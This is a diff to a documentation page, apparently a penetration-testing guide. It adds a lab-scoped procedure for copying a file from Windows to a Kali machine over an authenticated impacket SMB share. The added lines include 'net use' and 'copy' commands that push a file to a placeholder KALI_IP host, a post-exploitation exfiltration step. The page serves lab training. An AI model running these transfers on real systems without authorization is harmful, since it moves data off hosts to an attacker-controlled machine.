@@ -7,7 +7,38 @@ boost: 10
 hideFooterPagination: true
 ---
 
+import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+
 {/* Generated from Commands/windows-to-linux.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+
+## Current operation: Copy a Windows file into an authenticated lab share
+
+**Run in:** Windows cmd.exe. **Requires:** On Kali first run an authenticated impacket-smbserver named share over a dedicated writable transfer folder; TCP 445 must be reachable from Windows.
+
+```console
+net use \\KALI_IP\share /user:transfer TRANSFER_PASSWORD
+copy C:\path\file.zip \\KALI_IP\share\file.zip
+```
+
+**Read the result:** Identify which side listens and which side initiates; verify the received filename, size and digest.
+
+**If The share connects but the destination copy fails:** HTTP download commands cannot upload by themselves; outbound connectivity, listener binding and destination write access all matter.
+
+**Next check:** Inspect destination rights and filename, compare size and SHA-256 at both ends, then disconnect this share with net use when finished.
+
+**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
+
+### Reviewed operation documentation
+
+- [Primary reference 1](https://github.com/fortra/impacket/blob/master/examples/smbserver.py)
+
+## Preserved earlier notes
+
+<PreservedNotes>
+
+Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
 
 ## Windows → Kali file transfer: choose the operation and read the result
 
@@ -96,3 +127,5 @@ Saves the file on the Kali machine running Evil-WinRM.
 - [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
 
 {/* VAULT_RELATED_END */}
+
+</PreservedNotes>
